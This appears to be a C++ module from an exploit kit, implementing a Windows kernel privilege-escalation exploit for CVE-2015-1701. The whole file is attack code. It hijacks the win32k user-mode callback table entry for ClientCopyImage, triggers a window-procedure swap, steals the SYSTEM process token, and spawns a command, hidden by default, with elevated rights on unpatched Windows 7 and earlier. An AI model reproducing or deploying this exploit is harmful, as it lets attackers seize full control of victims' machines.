#include <tchar.h>
#include <Windows.h>
#include "../Utils/EopUtils.h"

#pragma section("wineop", read, execute)
#pragma code_seg("wineop")

namespace CVE_2015_1701
{
	typedef NTSTATUS (NTAPI *pUser32_ClientCopyImage)(PVOID p);
	typedef struct CALLBACK_DATA
	{
		BOOL g_shellCalled;
		PVOID* g_ppCCI;
		pUser32_ClientCopyImage g_originalCCI;
	}CALLBACK_DATA;

#pragma optimize("", off)
	NTSTATUS NTAPI hookCCI( PVOID p )
	{
		LPENVIRONMENT lpEnv = (LPENVIRONMENT) ENVIRONMENT_TAG;
		CALLBACK_DATA * cp = (CALLBACK_DATA*) lpEnv->dwUserData;
		__InterlockedExchangePointer__(lpEnv, cp->g_ppCCI, cp->g_originalCCI); //restore original callback
		HWND hwndFirstThread = GetFirstThreadHwnd(lpEnv, lpEnv->pti);
		if (hwndFirstThread)
			CWA(lpEnv, SetWindowLongA)(hwndFirstThread, GWLP_WNDPROC, 
			(LONG_PTR)lpEnv->lpWinapiTable->DefWindowProcA);// trigger here

		return cp->g_originalCCI(p);
	}
	
	LRESULT CALLBACK WindowProc(
		__in HWND hwnd, 
		__in UINT uMsg,
		__in WPARAM wParam,
		__in LPARAM lParam )
	{
		UNREFERENCED_PARAMETER(hwnd);
		UNREFERENCED_PARAMETER(uMsg);
		UNREFERENCED_PARAMETER(wParam);
		UNREFERENCED_PARAMETER(lParam);
		LPENVIRONMENT lpEnv = (LPENVIRONMENT) ENVIRONMENT_TAG;
		CALLBACK_DATA * cp = (CALLBACK_DATA*) lpEnv->dwUserData;
		if (!cp->g_shellCalled)
		{
			cp->g_shellCalled = TRUE;
			StealSystemProcessToken();
		}
		return 0;
	}

#pragma optimize("", on)

	BOOL Exploit( __in LPENVIRONMENT lpEnv, 
		__in DWORD dwPid, 
		__inout_opt LPSTR lpCommandLine /*= NULL*/, __in WORD wShowWindow /*= SW_HIDE */ )
	{
		CALLBACK_DATA cp;
		lpEnv->dwCurrentPid = dwPid;
		lpEnv->dwUserData = (DWORD_PTR)&cp;

		__MEMSET__(&cp, 0, sizeof(cp));
		if (ENV_SUCCESS != GetEnvironment(lpEnv)) return FALSE;
		FixPointer(lpEnv, GET_FUNCTION_ADDRESS(lpEnv, hookCCI), ENVIRONMENT_TAG );
		FixPointer(lpEnv, GET_FUNCTION_ADDRESS(lpEnv, WindowProc), ENVIRONMENT_TAG );
		
		if (lpEnv->osver.dwBuildNumber > 7601) return FALSE; 
		if (lpEnv->bIsWow64Process) return FALSE;

		WNDCLASSEXA wincls;
		ATOM class_atom;
		__MEMSET__(&wincls, 0, sizeof(wincls));
		wincls.cbSize = sizeof(wincls);
		wincls.lpfnWndProc = (WNDPROC)GET_FUNCTION_ADDRESS(lpEnv, WindowProc);
		wincls.hIcon = CWA(lpEnv, LoadIconA)(NULL, MAKEINTRESOURCEA(32512)); // IDI_APPLICATION
		char stran0nym0us[10] = { 'a', 'n', '0', 'n', 'y', 'm', '0', 'u', 's', '\0'};
		wincls.lpszClassName = stran0nym0us;

		class_atom = CWA(lpEnv, RegisterClassExA)(&wincls);
		if (class_atom == 0)
		{
			PrintDebug("RegisterClassEx failed\n");
			return FALSE;
		}

		cp.g_ppCCI = &((PVOID *)GetWin32kUserModeCallbackTable(lpEnv))[0x36]; //User32_ClientCopyImage INDEX	
		DWORD prot;
		if (!CWA(lpEnv, VirtualProtect)(cp.g_ppCCI, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &prot)) return FALSE;

		cp.g_originalCCI = (pUser32_ClientCopyImage)__InterlockedExchangePointer__(lpEnv, cp.g_ppCCI, 
			GET_FUNCTION_ADDRESS(lpEnv, hookCCI));

		CWA(lpEnv, CreateWindowExA)(0, MAKEINTATOMA(class_atom), NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

		if (cp.g_shellCalled)
			SpawnNewProcess(lpEnv, lpCommandLine, wShowWindow);
		return TRUE;
	}
}